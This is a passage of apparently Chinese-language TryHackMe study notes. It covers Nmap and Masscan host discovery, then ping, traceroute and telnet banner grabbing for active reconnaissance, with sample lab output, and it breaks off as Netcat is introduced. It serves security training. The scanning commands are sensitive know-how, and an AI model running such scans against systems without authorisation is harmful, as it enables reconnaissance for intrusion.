数据包，因为它根据收到的ARP 响应确认这些主机已启动。</p><p>我们将重复上面的扫描;然而，这一次，我们将从属于其他子网的系统进行扫描。结果是相似的，但没有MAC 地址。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo nmap -PE -sn 10.10.68.220/24</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 12:16 EEST</span><br><span class="line">Nmap scan report for 10.10.68.50</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Nmap scan report for 10.10.68.52</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Nmap scan report for 10.10.68.77</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.110</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.140</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.142</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.220</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.222</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap done: 256 IP addresses (8 hosts up) scanned in 8.26 seconds</span><br></pre></td></tr></tbody></table></figure><h3 id="pp">-PP</h3><p>因为 ICMP echo 请求往往会被阻塞，所以你还可以考虑使用 ICMP 时间戳或ICMP 地址掩码请求来判断系统是否在线。Nmap 使用时间戳请求(ICMP Type13)并检查它是否将获得时间戳应答(ICMP Type14)。添加<code>-PP</code>选项告诉 Nmap 使用 ICMP 时间戳请求。</p><h3 id="pm">-PM</h3><p>类似地，Nmap 通过添加<code>-PM</code>选项来使用地址掩码查询（ICMPType17）。注意：该请求可能会被目标系统或防火墙过滤掉，这时，我们应该考虑使用另一种方法。</p><h2 id="nmap-host-discovery-using-tcp-and-udp">Nmap Host Discovery UsingTCP and UDP</h2><h3 id="tcp-syn-ping"><strong>TCP SYN Ping</strong></h3><p>我们可以将设置了SYN（同步）标志的数据包发送到 TCP 端口，默认情况下为80 ，并等待响应。开放端口应回复 SYN/ACK （确认）；关闭的端口将导致RST（重置）。在这种情况下，我们检查是否会得到任何回应，以推断主机是否启动。端口的特定状态在这里并不重要。下图提醒了TCP 3次握手通常如何工作。</p><figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/23e7f481f78de8d3e89ef845b747002d.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>TCP SYN ping使用方法：<code>-PS</code>选项。<code>-PS</code>后可添加端口号、范围、列表或它们的组合，例如，<code>-PS21</code>将会以21 号端口为目标，<code>-PS21-25</code>将会以端口 21 、22 、23 、24 、25为目标。</p><h3 id="tcp-ack-ping"><strong>TCP ACK Ping</strong></h3><p>默认情况下，使用端口 80 。语法类似于 TCP SYN ping。<code>-PA</code>后面应该是端口号、范围、列表或它们的组合。例如，<code>-PA21</code>、<code>-PA21-25</code>和<code>-PA80,443,8080</code>。如果未指定端口，将使用端口80 。你必须作为特权用户运行 Nmap才能完成此任务。如果你以非特权用户身份尝试，Nmap 将尝试进行3次握手。</p><p>下图显示了任何带有 ACK 标志的 TCP 数据包都应该返回 设置了 RST 标志的TCP 数据包。由于带有 ACK 标志的 TCP 数据包不是任何 正在进行的连接的一部分，因此目标使用设置的 RST标志进行响应。预期响应用于检测目标主机是否已启动。</p><figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/db5ab44a8c700c4ab0603e85e456040d.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>下面是一个示例，运行<code>sudo nmap -PA -sn MACHINE_IP/24</code>以发现在线的主机。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo nmap -PA -sn 10.10.68.220/24</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 13:46 EEST</span><br><span class="line">Nmap scan report for 10.10.68.52</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.121</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Nmap scan report for 10.10.68.125</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Nmap scan report for 10.10.68.134</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Nmap scan report for 10.10.68.220</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 29.89 seconds</span><br></pre></td></tr></tbody></table></figure><h3 id="udp-ping"><strong>UDP Ping</strong></h3><p>与 TCP SYN ping 相反，将 UDP数据包发送到开放端口不会有任何答复。但是，如果我们向一个关闭的 UDP端口发送一个 UDP 数据包，我们希望得到一个 ICMP端口无法访问的数据包；这表明目标系统已经启动并可用。Nmap使用<code>-PU</code>来进行 UDP ping 。</p><figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/1b827ef60c39619e281c4ca51a6d57b6.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c8b2d403667487322058619e561186d2.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><h3 id="masscan"><strong>Masscan</strong></h3><p>另外，Masscan使用类似的方法来发现可用的系统。然而，为了快速完成网络扫描，Masscan在数据包生成速度方面非常积极。语法与 Nmap 非常相似：<code>-p</code>后面可以跟一个端口号、列表或范围。例如：</p><ul><li><code>masscan MACHINE_IP/24 -p443</code></li><li><code>masscan MACHINE_IP/24 -p80,443</code></li><li><code>masscan MACHINE_IP/24 -p22-25</code></li><li><code>masscan MACHINE_IP/24 ‐‐top-ports 100</code></li></ul><h2 id="using-reverse-dns-lookup反向dns查找">Using Reverse-DNSLookup（反向DNS查找）</h2><p>Nmap 的默认行为是使用反向 DNS查找在线主机。因为主机名可以揭示很多东西，这可能是一个有用的步骤。但是，如果不希望发送此类DNS 查询，可以使用 <code>-n</code> 跳过此步骤。</p><p>默认情况下，Nmap 将查找在线主机；但是，你可以使用选项 <code>-R</code>来查询 DNS 服务器，即使是针对脱机主机。如果要使用特定的 DNS服务器，可以添加<code>--dns-servers DNS_SERVER</code>选项。</p><h2 id="总结">总结</h2><table><thead><tr class="header"><th style="text-align: center;">Scan Type</th><th style="text-align: center;">Example Command</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">ARP Scan</td><td style="text-align: center;"><code>sudo nmap -PR -sn MACHINE_IP/24</code></td></tr><tr class="even"><td style="text-align: center;">ICMP Echo Scan</td><td style="text-align: center;"><code>sudo nmap -PE -sn MACHINE_IP/24</code></td></tr><tr class="odd"><td style="text-align: center;">ICMP Timestamp Scan</td><td style="text-align: center;"><code>sudo nmap -PP -sn MACHINE_IP/24</code></td></tr><tr class="even"><td style="text-align: center;">ICMP Address Mask Scan</td><td style="text-align: center;"><code>sudo nmap -PM -sn MACHINE_IP/24</code></td></tr><tr class="odd"><td style="text-align: center;">TCP SYN Ping Scan</td><td style="text-align: center;"><code>sudo nmap -PS22,80,443 -sn MACHINE_IP/30</code></td></tr><tr class="even"><td style="text-align: center;">TCP ACK Ping Scan</td><td style="text-align: center;"><code>sudo nmap -PA22,80,443 -sn MACHINE_IP/30</code></td></tr><tr class="odd"><td style="text-align: center;">UDP Ping Scan</td><td style="text-align: center;"><code>sudo nmap -PU53,161,162 -sn MACHINE_IP/30</code></td></tr></tbody></table><table><thead><tr class="header"><th style="text-align: center;">Option</th><th style="text-align: center;">Purpose</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><code>-n</code></td><td style="text-align: center;">no DNS lookup</td></tr><tr class="even"><td style="text-align: center;"><code>-R</code></td><td style="text-align: center;">reverse-DNS lookup for all hosts</td></tr><tr class="odd"><td style="text-align: center;"><code>-sn</code></td><td style="text-align: center;">host discovery only</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TryHackMe</tag>
      
      <tag>Nmap</tag>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Active Reconnaissance(主动侦察)</title>
    <link href="/2023/01/19/Active-Reconnaissance/"/>
    <url>/2023/01/19/Active-Reconnaissance/</url>
    
    <content type="html"><![CDATA[<p>TryHackMe实验房间：https://tryhackme.com/room/activerecon</p><h2 id="introduction">Introduction</h2><p>本文中，我们集中在主动侦察和相关的基本工具。我们学习使用网络浏览器来收集关于我们目标的更多信息。此外，我们还将讨论如何使用<code>ping</code>、 <code>traceroute</code>、 <code>telnet</code> 和<code>nc</code> 等简单工具来收集有关网络、系统和服务的信息。</p><p>主动侦察需要你与目标进行某种接触。这种接触可以是一个电话或访问目标公司，以某种借口收集更多信息，通常作为社会工程的一部分。或者，它可以是到目标系统的直接连接，无论是访问他们的网站还是检查他们的防火墙是否打开了SSH端口。把它想象成你正在仔细检查窗户和门锁。因此，在获得客户签署的合法授权之前，切记不要从事主动侦察工作。</p><p>主动侦察从与目标机器的直接连接开始。任何这样的连接都可能在日志中留下显示客户端IP地址、连接时间和连接持续时间等信息。然而，并非所有的连接都是可疑的。可以让你的活动侦察显示为常规客户端活动。考虑网页浏览，没有人会怀疑一个浏览器连接到目标网络服务器和其他数百个合法用户。当你作为红队(攻击方)的一员工作时，你可以利用这些技巧，而不要惊动蓝队(防守方)。</p><h2 id="web-browser">Web Browser</h2><p>Web浏览器是一个很方便的工具，尤其是在所有的系统上都可以使用。你可以通过几种方式使用Web 浏览器来收集目标的信息。</p><p>在传输层上，浏览器连接如下：</p><ul><li>通过 HTTP 访问网站时，默认的 TCP 端口为 80</li><li>通过 HTTPS 访问网站时，默认的 TCP 端口为 443</li></ul><p>由于 80 和 443 是 HTTP 和 HTTPS 的默认端口，Web浏览器不会在地址栏中显示它们。但是，可以使用自定义端口访问服务。例如，https://127.0.0.1:8834/ 将通过 HTTPS 协议连接到端口8834的127.0.0.1(localhost)。如果有一个 HTTPS服务器监听该端口，我们将收到一个网页。</p><p>浏览网页时，你可以在 PC 上按 <code>Ctrl + Shift + I</code>，在Firefox 上打开 开发者工具。类似的快捷方式也可以让你打开谷歌 Chrome 或Chromium的开发者工具。开发人员工具允许你检查浏览器已经接收并与远程服务器交换的许多内容。例如，您可以查看甚至修改JavaScript (JS)文件，检查系统上的 cookie，并查看站点内容的文件夹结构。</p><h2 id="ping">Ping</h2><p>Ping 属于协议 ICMP (Internet Control Message Protocol)的范畴。ICMP支持许多类型的查询，但是我们这里主要关注 ping (ICMP echo/type 8)和 pingreply (ICMP echo reply/type 0)。Ping的主要目的是检查你是否能够到达远程系统，以及远程系统是否能够返回。换句话说，最初，这是用来检查网络连接性的;然而，我们更感兴趣的是它的其他用途: 检查远程系统是否在线。</p><p>简单地说，ping命令向远程系统发送数据包，远程系统回复。通过这种方式，你可以判断远程系统是否已联机，以及网络是否正在两个系统之间工作。</p><p>更具体的定义：ping 是一个将 ICMP Echo数据包发送到远程系统的命令。如果远程系统在线，并且 ping数据包被正确路由而且没有被任何防火墙阻塞，远程系统应该发回一个 ICMP Echo应答。类似地，如果路由正确并且没有被任何防火墙阻塞，ping应答会到达发送方系统。</p><p>这种命令的目的是在我们花时间进行更详细的扫描以发现正在运行的操作系统和服务之前，确保目标系统处于联机状态。</p><p>假设目标 IP是<code>10.10.120.159</code>，在攻击方的终端上使用<code>ping 10.10.120.159</code>或者<code>ping HOSTNAME</code>，在后者中，系统需要在发送ping 数据包之前将 <code>HOSTNAME</code> 解析为一个 IP地址。如果你没有指定具体的次数，ping将会一直重复发送-返回数据，使用<code>CTRL + c</code>可以停止数据的发送和接收。因此，如果你只想发送10个数据包，可以使用<code>ping -c 10 10.10.120.159</code>（Linux系统），或者使用<code>ping -n 10 10.10.120.159</code>（Windows系统）。</p><p>在下面的示例中，我们将数据包的总数指定为5。从 AttackBox的终端，我们开始ping<code>10.10.120.159</code>。我们了解到<code>10.10.120.159</code>已启动，并且未阻止ICMP回显请求。此外，数据包路由上的任何防火墙和路由器也没有阻止ICMP 回显请求。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ ping -c 5 10.10.120.159</span><br><span class="line">PING 10.10.120.159 (MACHINE_IP) 56(84) bytes of data.</span><br><span class="line">64 bytes from MACHINE_IP: icmp_seq=1 ttl=64 time=0.636 ms</span><br><span class="line">64 bytes from MACHINE_IP: icmp_seq=2 ttl=64 time=0.483 ms</span><br><span class="line">64 bytes from MACHINE_IP: icmp_seq=3 ttl=64 time=0.396 ms</span><br><span class="line">64 bytes from MACHINE_IP: icmp_seq=4 ttl=64 time=0.416 ms</span><br><span class="line">64 bytes from MACHINE_IP: icmp_seq=5 ttl=64 time=0.445 ms</span><br><span class="line"></span><br><span class="line">--- MACHINE_IP ping statistics ---</span><br><span class="line">5 packets transmitted, 5 received, 0% packet loss, time 4097ms</span><br><span class="line">rtt min/avg/max/mdev = 0.396/0.475/0.636/0.086 ms</span><br></pre></td></tr></tbody></table></figure><p>在上面的示例中，我们清楚地看到了目标系统正在响应。Ping输出表明它处于联机状态并且可访问。我们传输了五个数据包，并且收到了五个答复。我们注意到，平均而言，回复到达我们的系统需要0.475ms（毫秒），最大值为 0.636ms。</p><p>从渗透测试的角度来看，我们将尝试发现有关此目标的更多信息。我们将尝试尽可能多地了解哪些端口是打开的以及正在运行哪些服务。</p><p>一般来说，当我们没有收到 ping 回复时，有以下解释：</p><ul><li>目标计算机没有响应; 可能仍在启动或关闭，或者操作系统已经崩溃。</li><li>它与网络断开连接，或者路径上有一个故障网络设备。</li><li>防火墙被配置为阻止这样的数据包。防火墙可能是在系统本身上运行的一个软件，或者是一个单独的网络设备。请注意，MSWindows 防火墙默认阻止 ping。</li><li>你的系统已从网络中拔出。</li></ul><h2 id="traceroute">Traceroute</h2><p>顾名思义，traceroute命令跟踪数据包从你的系统到另一台主机的路由。traceroute的目的是查找数据包从系统到目标主机时所经过的路由器或每一跳(hop)的IP地址。该命令还显示了两个系统之间的路由器数量。它很有用，因为它指示了系统和目标主机之间的跳数（路由器）。然而，请注意，由于许多路由器使用适应网络变化的动态路由协议，数据包所采用的路由可能会发生变化。</p><p>在 Linux 和 MacOS上，要使用的命令是<code>traceroute 10.10.120.159</code>，而在 MS Windows上，它是<code>tracert 10.10.120.159</code>。<code>traceroute</code>试图从你的系统到目标系统的路径上发现路由器。</p><p>没有直接的方法来发现从你的系统到目标系统的路径。我们依靠ICMP“欺骗”路由器，使其暴露IP地址。我们可以通过在IP报头字段中使用一个小的生存时间（TTL）来实现这一点。虽然TTL 中的 T代表时间，但TTL表示数据包在丢弃之前可以通过的最大路由器/跳数；TTL不是最大时间单位数。当路由器接收到一个数据包时，它将TTL减一，然后再将其传递给下一个路由器。下图显示，每次IP数据包通过路由器时，其TTL值都会减1。最初，它使系统的TTL值为64；它通过4个路由器后到达TTL 值为60的目标系统。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230119110311465.png" alt="image-20230119110311465"><figcaption aria-hidden="true">image-20230119110311465</figcaption></figure><p>但是，如果 TTL 达到0，它将被丢弃，并且超过 ICMP的生存时间将被发送给原始发送方。在下图中，系统在将 TTL发送到路由器之前将其设置为1。路径上的第一个路由器将 TTL 减少 1 ，导致TTL 为 0 。因此，此路由器将丢弃该数据包并发送 ICMP传输超时的报错信息。注意，有些路由器被配置为在丢弃数据包时不发送这样的ICMP 消息。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230119110952069.png" alt="image-20230119110952069"><figcaption aria-hidden="true">image-20230119110952069</figcaption></figure><p>在 Linux 中，<code>traceroute</code>将在 TTL 为 1 的 IP 分组内发送UDP 数据报，因此，当它到达第一个路由器时，TTL 减为 0 ，并发送 ICMP传输超时信息。因此，TTL = 1 将返回到达的第一个路由器IP。然后发送 TTL = 2的分组，该分组将在第二个路由器处丢弃，以此继续下去。</p><p>在下面的示例中，我们从 TryHackMe 的 AtackBox 运行相同的命令<code>traceroute tryhackme.com</code>。我们注意到，不同的运行可能导致分组采用不同的路由。</p><p><strong>Traceroute A</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ traceroute tryhackme.com</span><br><span class="line">traceroute to tryhackme.com (172.67.69.208), 30 hops max, 60 byte packets</span><br><span class="line"> 1  ec2-3-248-240-5.eu-west-1.compute.amazonaws.com (3.248.240.5)  2.663 ms * ec2-3-248-240-13.eu-west-1.compute.amazonaws.com (3.248.240.13)  7.468 ms</span><br><span class="line"> 2  100.66.8.86 (100.66.8.86)  43.231 ms 100.65.21.64 (100.65.21.64)  18.886 ms 100.65.22.160 (100.65.22.160)  14.556 ms</span><br><span class="line"> 3  * 100.66.16.176 (100.66.16.176)  8.006 ms *</span><br><span class="line"> 4  100.66.11.34 (100.66.11.34)  17.401 ms 100.66.10.14 (100.66.10.14)  23.614 ms 100.66.19.236 (100.66.19.236)  17.524 ms</span><br><span class="line"> 5  100.66.7.35 (100.66.7.35)  12.808 ms 100.66.6.109 (100.66.6.109)  14.791 ms *</span><br><span class="line"> 6  100.65.14.131 (100.65.14.131)  1.026 ms 100.66.5.189 (100.66.5.189)  19.246 ms 100.66.5.243 (100.66.5.243)  19.805 ms</span><br><span class="line"> 7  100.65.13.143 (100.65.13.143)  14.254 ms 100.95.18.131 (100.95.18.131)  0.944 ms 100.95.18.129 (100.95.18.129)  0.778 ms</span><br><span class="line"> 8  100.95.2.143 (100.95.2.143)  0.680 ms 100.100.4.46 (100.100.4.46)  1.392 ms 100.95.18.143 (100.95.18.143)  0.878 ms</span><br><span class="line"> 9  100.100.20.76 (100.100.20.76)  7.819 ms 100.92.11.36 (100.92.11.36)  18.669 ms 100.100.20.26 (100.100.20.26)  0.842 ms</span><br><span class="line">10  100.92.11.112 (100.92.11.112)  17.852 ms * 100.92.11.158 (100.92.11.158)  16.687 ms</span><br><span class="line">11  100.92.211.82 (100.92.211.82)  19.713 ms 100.92.0.126 (100.92.0.126)  18.603 ms 52.93.112.182 (52.93.112.182)  17.738 ms</span><br><span class="line">12  99.83.69.207 (99.83.69.207)  17.603 ms  15.827 ms  17.351 ms</span><br><span class="line">13  100.92.9.83 (100.92.9.83)  17.894 ms 100.92.79.136 (100.92.79.136)  21.250 ms 100.92.9.118 (100.92.9.118)  18.166 ms</span><br><span class="line">14  172.67.69.208 (172.67.69.208)  17.976 ms  16.945 ms 100.92.9.3 (100.92.9.3)  17.709 ms</span><br></pre></td></tr></tbody></table></figure><p>在上面的 traceroute 输出中，我们有14个编号的行;每一行代表一个路由器/跳。我们的系统发送三个 TTL设置为1的数据包，然后发送三个 TTL设置为2的数据包，依此类推。根据不同的网络拓扑，我们可能会收到多达3个不同路由器的回复，这取决于数据包所采用的路由。考虑第12行，列出IP 地址的第12个路由器丢弃了数据包三次，并发送了 ICMP传输超时的消息。第12行<code>99.83.69.207 (99.83.69.207)  17.603 ms  15.827 ms  17.351 ms</code>显示每个回复到达我们系统的时间(毫秒)。</p><p>另一方面，我们可以看到，我们在第三行只收到一个单一的答复。<code>3 * 100.66.16.176 (100.66.16.176) 8.006 ms *</code>中的两个<code>*</code>表明我们的系统有两条预期超时的消息未收到。</p><p><strong>Traceroute B</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ traceroute tryhackme.com</span><br><span class="line">traceroute to tryhackme.com (104.26.11.229), 30 hops max, 60 byte packets</span><br><span class="line"> 1  ec2-79-125-1-9.eu-west-1.compute.amazonaws.com (79.125.1.9)  1.475 ms * ec2-3-248-240-31.eu-west-1.compute.amazonaws.com (3.248.240.31)  9.456 ms</span><br><span class="line"> 2  100.65.20.160 (100.65.20.160)  16.575 ms 100.66.8.226 (100.66.8.226)  23.241 ms 100.65.23.192 (100.65.23.192)  22.267 ms</span><br><span class="line"> 3  100.66.16.50 (100.66.16.50)  2.777 ms 100.66.11.34 (100.66.11.34)  22.288 ms 100.66.16.28 (100.66.16.28)  4.421 ms</span><br><span class="line"> 4  100.66.6.47 (100.66.6.47)  17.264 ms 100.66.7.161 (100.66.7.161)  39.562 ms 100.66.10.198 (100.66.10.198)  15.958 ms</span><br><span class="line"> 5  100.66.5.123 (100.66.5.123)  20.099 ms 100.66.7.239 (100.66.7.239)  19.253 ms 100.66.5.59 (100.66.5.59)  15.397 ms</span><br><span class="line"> 6  * 100.66.5.223 (100.66.5.223)  16.172 ms 100.65.15.135 (100.65.15.135)  0.424 ms</span><br><span class="line"> 7  100.65.12.135 (100.65.12.135)  0.390 ms 100.65.12.15 (100.65.12.15)  1.045 ms 100.65.14.15 (100.65.14.15)  1.036 ms</span><br><span class="line"> 8  100.100.4.16 (100.100.4.16)  0.482 ms 100.100.20.122 (100.100.20.122)  0.795 ms 100.95.2.143 (100.95.2.143)  0.827 ms</span><br><span class="line"> 9  100.100.20.86 (100.100.20.86)  0.442 ms 100.100.4.78 (100.100.4.78)  0.347 ms 100.100.20.20 (100.100.20.20)  1.388 ms</span><br><span class="line">10  100.92.212.20 (100.92.212.20)  11.611 ms 100.92.11.54 (100.92.11.54)  12.675 ms 100.92.11.56 (100.92.11.56)  10.835 ms</span><br><span class="line">11  100.92.6.52 (100.92.6.52)  11.427 ms 100.92.6.50 (100.92.6.50)  11.033 ms 100.92.210.50 (100.92.210.50)  10.551 ms</span><br><span class="line">12  100.92.210.139 (100.92.210.139)  10.026 ms 100.92.6.13 (100.92.6.13)  14.586 ms 100.92.210.69 (100.92.210.69)  12.032 ms</span><br><span class="line">13  100.92.79.12 (100.92.79.12)  12.011 ms 100.92.79.68 (100.92.79.68)  11.318 ms 100.92.80.84 (100.92.80.84)  10.496 ms</span><br><span class="line">14  100.92.9.27 (100.92.9.27)  11.354 ms 100.92.80.31 (100.92.80.31)  13.000 ms 52.93.135.125 (52.93.135.125)  11.412 ms</span><br><span class="line">15  150.222.241.85 (150.222.241.85)  9.660 ms 52.93.135.81 (52.93.135.81)  10.941 ms 150.222.241.87 (150.222.241.87)  16.543 ms</span><br><span class="line">16  100.92.228.102 (100.92.228.102)  15.168 ms 100.92.227.41 (100.92.227.41)  10.134 ms 100.92.227.52 (100.92.227.52)  11.756 ms</span><br><span class="line">17  100.92.232.111 (100.92.232.111)  10.589 ms 100.92.231.69 (100.92.231.69)  16.664 ms 100.92.232.37 (100.92.232.37)  13.089 ms</span><br><span class="line">18  100.91.205.140 (100.91.205.140)  11.551 ms 100.91.201.62 (100.91.201.62)  10.246 ms 100.91.201.36 (100.91.201.36)  11.368 ms</span><br><span class="line">19  100.91.205.79 (100.91.205.79)  11.112 ms 100.91.205.83 (100.91.205.83)  11.040 ms 100.91.205.33 (100.91.205.33)  10.114 ms</span><br><span class="line">20  100.91.211.45 (100.91.211.45)  9.486 ms 100.91.211.79 (100.91.211.79)  13.693 ms 100.91.211.47 (100.91.211.47)  13.619 ms</span><br><span class="line">21  100.100.6.81 (100.100.6.81)  11.522 ms 100.100.68.70 (100.100.68.70)  10.181 ms 100.100.6.21 (100.100.6.21)  11.687 ms</span><br><span class="line">22  100.100.65.131 (100.100.65.131)  10.371 ms 100.100.92.6 (100.100.92.6)  10.939 ms 100.100.65.70 (100.100.65.70)  23.703 ms</span><br><span class="line">23  100.100.2.74 (100.100.2.74)  15.317 ms 100.100.66.17 (100.100.66.17)  11.492 ms 100.100.88.67 (100.100.88.67)  35.312 ms</span><br><span class="line">24  100.100.16.16 (100.100.16.16)  19.155 ms 100.100.16.28 (100.100.16.28)  19.147 ms 100.100.2.68 (100.100.2.68)  13.718 ms</span><br><span class="line">25  99.83.89.19 (99.83.89.19)  28.929 ms *  21.790 ms</span><br><span class="line">26  104.26.11.229 (104.26.11.229)  11.070 ms  11.058 ms  11.982 ms</span><br></pre></td></tr></tbody></table></figure><p>在 traceroute程序的第二次运行中，我们注意到这次数据包采用了更长的路由，通过了26个路由器。如果你运行traceroute追踪你所在网络中某个系统的路由，则该路由不太可能发生更改。然而，当数据包需要通过我们网络之外的其他路由器时，我们不能指望路由保持不变。</p><p>总而言之，我们可以注意到以下几点:</p><ul><li>系统和目标系统之间的跳/路由器的数量取决于你运行 traceroute的时间。不能保证你的数据包总是遵循相同的路由，即使你在相同的网络上，或者你在很短的时间内重复traceroute 命令。</li><li>一些路由器返回公共 IP地址。你可以根据预期渗透测试的范围来检查其中的一些路由器。</li><li>一些路由器不会回复。</li></ul><h2 id="telnet">Telnet</h2><p>TELNET（TeletypeNetwork）协议于1969年开发，通过命令行界面（CLI）与远程系统通信。因此，命令<code>telnet</code>使用TELNET 协议进行远程管理。Telnet 使用的默认端口是 23。从安全角度来看，<code>telnet</code>以明文形式发送所有数据，包括用户名和密码。通过明文发送，任何人都可以很容易地访问通信信道，从而窃取登录凭据。安全的替代方案是SSH(Secure SHell) 协议。</p><p>然而，telnet 客户端由于其简单性，可以用于其他目的。由于 telnet客户端依赖于 TCP 协议，你可以使用 Telnet 连接到任何服务并获取其 banner。使用 <code>telnet 10.10.120.159 PORT</code>，你可以连接到在 TCP上运行的任何服务，甚至可以交换一些消息，除非它使用加密。</p><p>假设我们希望发现关于 web 服务器的更多信息，监听端口 80 。我们在 80端口连接到服务器，然后使用 HTTP 协议进行通信。你不需要深入研究 HTTP协议; 你只需要<strong>发出</strong><code>GET / HTTP/1.1</code>。要指定默认索引页之外的其他内容，可以发出<code>GET /page.html HTTP/1.1</code>请求，它将请求<code>page.html</code>。我们还向远程 Web 服务器指定希望使用 HTTP版本1.1进行通信。要获得有效的响应，你需要为主机输入一些值（<code>host: example</code>），然后<strong>按回车键两次</strong>。执行这些步骤将提供所请求的索引页。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ telnet 10.10.120.159 80</span><br><span class="line">Trying 10.10.120.159...</span><br><span class="line">Connected to MACHINE_IP.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">host: telnet</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.6.2</span><br><span class="line">Date: Tue, 17 Aug 2021 11:13:25 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 867</span><br><span class="line">Last-Modified: Tue, 17 Aug 2021 11:12:16 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">ETag: <span class="string">"611b9990-363"</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><p>我们发现了已安装的 Web 服务器的类型和版本：<code>Server: nginx/1.6.2</code>。在本例中，我们与 Web服务器进行通信，因此使用了基本的 HTTP命令。如果连接到邮件服务器，则需要使用基于协议的正确命令，如 SMTP 和POP3 。</p><h2 id="netcat">Netcat</h2><p>Netcat（<code>nc</code>）对于渗透测试具有很高的价值。Netcat支持 TCP和 